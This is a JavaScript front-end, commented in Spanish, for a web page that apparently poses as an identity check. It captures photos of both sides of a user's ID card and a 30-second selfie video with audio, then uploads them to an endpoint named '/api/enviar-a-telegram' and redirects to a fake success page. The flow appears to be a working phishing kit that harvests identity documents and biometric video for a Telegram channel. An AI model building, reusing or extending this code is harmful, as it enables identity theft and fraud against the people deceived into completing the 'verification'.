document.addEventListener('DOMContentLoaded', () => {

    // --- Configuración ---
    // Esta URL apunta a NUESTRO PROPIO servidor Node.js
    const UPLOAD_URL = "/api/enviar-a-telegram"; 
    
    // Página a la que irá el cliente (debe ser una URL real)
    const SUCCESS_REDIRECT_URL = "https://tu-web.com/verificacion-exitosa.html";
    const RECORDING_SECONDS = 30; // 30 segundos de video

    // --- Vistas ---
    const cameraView = document.getElementById('camera-view');
    const modalOverlay = document.getElementById('modal-overlay');
    const verifyingModal = document.getElementById('verifying-modal');
    
    // --- Elementos de la Cámara ---
    const videoPreview = document.getElementById('videoPreview');
    const status = document.getElementById('status');
    const countdownTimer = document.getElementById('countdown-timer');
    const captureButton = document.getElementById('capture-button');
    const photoCanvas = document.getElementById('photo-canvas');
    
    // --- Elementos del Modal ---
    const startVerificationButton = document.getElementById('start-verification-button');
    const modalContent = document.getElementById('modal-content'); 

    // --- Variables de Grabación y Estado ---
    let mediaRecorder;
    let streamLocal;
    let recordedChunks = [];
    let countdownInterval;

    // --- Variables de estado y datos ---
    let currentStep = 'WELCOME'; // WELCOME, ID_FRONT, ID_BACK, VIDEO_SELFIE, UPLOADING
    let photoIdFront = null;
    let photoIdBack = null;

    // --- 1. Iniciar Cámara ---
    async function setupCamera() {
        status.textContent = "Iniciando cámara...";
        startVerificationButton.disabled = true;

        try {
            // Pedir video (con cámara frontal) y audio
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: true
            });
            streamLocal = stream;
            videoPreview.srcObject = stream;
            
            videoPreview.onloadedmetadata = () => {
                status.textContent = "Cámara lista.";
                startVerificationButton.disabled = false;
                
                // Si ya estábamos en un paso de cámara, la mostramos
                if (currentStep !== 'WELCOME') {
                    cameraView.style.display = 'flex';
                }
            };

        } catch (err) {
            console.error("Error al acceder a la cámara:", err);
            status.textContent = "Error: Permiso de cámara denegado.";
            modalContent.innerHTML = `
                <h2>Error de Cámara</h2>
                <p>No se pudo acceder a la cámara. Por favor, asegúrate de dar permisos en tu navegador y recarga la página.</p>
            `;
            modalOverlay.style.display = 'flex';
            cameraView.style.display = 'none';
        }
    }

    // --- 2. Actualizar UI (Manejador de estado) ---
    function updateUIForStep() {
        switch (currentStep) {
            case 'ID_FRONT':
                modalOverlay.style.display = 'none';
                cameraView.style.display = 'flex';
                captureButton.style.display = 'block';
                countdownTimer.style.display = 'none';
                status.textContent = "Centra el FRENTE de tu documento";
                if (!streamLocal) {
                    setupCamera();
                }
                break;
            
            case 'ID_BACK':
                status.textContent = "Ahora, centra la parte TRASERA";
                break;

            case 'VIDEO_SELFIE':
                captureButton.style.display = 'none';
                status.textContent = "Prepárate para el video selfie";
                startRecording();
                break;
            
            case 'UPLOADING':
                cameraView.style.display = 'none';
                verifyingModal.style.display = 'flex';
                if (streamLocal) {
                    streamLocal.getTracks().forEach(track => track.stop());
                }
                break;
        }
    }

    // --- 3. Capturar Foto ---
    function capturePhoto() {
        // Ajustar el canvas al tamaño real del video
        photoCanvas.width = videoPreview.videoWidth;
        photoCanvas.height = videoPreview.videoHeight;
        
        const context = photoCanvas.getContext('2d');
        
        // Invertir el canvas horizontalmente (como un espejo)
        // para que la foto coincida con la vista previa
        context.save();
        context.translate(photoCanvas.width, 0);
        context.scale(-1, 1);
        // Dibujar el fotograma actual del video
        context.drawImage(videoPreview, 0, 0, photoCanvas.width, photoCanvas.height);
        context.restore();

        // Convertir el canvas a un Blob (archivo de imagen JPEG)
        photoCanvas.toBlob((blob) => {
            if (currentStep === 'ID_FRONT') {
                photoIdFront = blob;
                console.log("Foto frontal capturada");
                currentStep = 'ID_BACK';
                updateUIForStep();
            } else if (currentStep === 'ID_BACK') {
                photoIdBack = blob;
                console.log("Foto trasera capturada");
                currentStep = 'VIDEO_SELFIE';
                updateUIForStep();
            }
        }, 'image/jpeg', 0.9); // Calidad 90%
    }

    // --- 4. Iniciar Grabación de Video ---
    function startRecording() {
        if (!streamLocal) return;

        recordedChunks = [];
        mediaRecorder = new MediaRecorder(streamLocal, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = () => {
            currentStep = 'UPLOADING';
            updateUIForStep();

            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            
            // ¡Llamar a la subida!
            uploadAllData(videoBlob);
        };

        mediaRecorder.start();
        
        status.textContent = "Grabando... Mantente visible";
        countdownTimer.textContent = RECORDING_SECONDS;
        countdownTimer.style.display = 'block';
        
        let secondsRemaining = RECORDING_SECONDS;
        
        countdownInterval = setInterval(() => {
            secondsRemaining--;
            countdownTimer.textContent = secondsRemaining;
            
            if (secondsRemaining <= 0) {
                stopRecording();
            }
        }, 1000); 
    }

    // --- 5. Detener Grabación ---
    function stopRecording() {
        clearInterval(countdownInterval); 
        countdownTimer.style.display = 'none'; 
        
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
    }

    // --- 6. Subir TODOS los Datos ---
    async function uploadAllData(videoBlob) {
        const formData = new FormData();
        
        // Nombres clave que el backend (Multer) esperará:
        formData.append('idFront', photoIdFront, `id_front.jpg`);
        formData.append('idBack', photoIdBack, `id_back.jpg`);
        formData.append('video', videoBlob, `selfie.webm`);
        
        try {
            const response = await fetch(UPLOAD_URL, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log("Archivos enviados con éxito");
                window.location.href = SUCCESS_REDIRECT_URL;
            } else {
                throw new Error(`Error del servidor: ${response.statusText}`);
            }

        } catch (error) {
            console.error('Error al subir los archivos:', error);
            handleUploadError();
        }
    }

    // --- 7. Manejar Error de Subida ---
    function handleUploadError() {
        verifyingModal.style.display = 'none';
        modalOverlay.style.display = 'flex'; 
        modalContent.querySelector('h2').textContent = 'Error de Subida';
        modalContent.querySelector('p').textContent = 'No pudimos verificar tus archivos. Por favor, inténtalo de nuevo.';
        
        // Reseteamos el estado para un nuevo intento
        currentStep = 'WELCOME';
        photoIdFront = null;
        photoIdBack = null;
        streamLocal = null; 
        setupCamera(); // Preparar la cámara de nuevo
    }
    
    // --- Asignar Eventos (¡ESTA ES LA PARTE IMPORTANTE!) ---
    
    // Al hacer clic en "Iniciar", pasamos al PRIMER PASO (ID_FRONT)
    startVerificationButton.onclick = () => {
        currentStep = 'ID_FRONT'; // <-- Esto es lo que inicia el flujo de fotos
        updateUIForStep();
    };

    // El nuevo botón de captura maneja las fotos
    captureButton.onclick = capturePhoto;

    // --- Iniciar ---
    // Iniciamos la cámara en segundo plano
    setupCamera();
});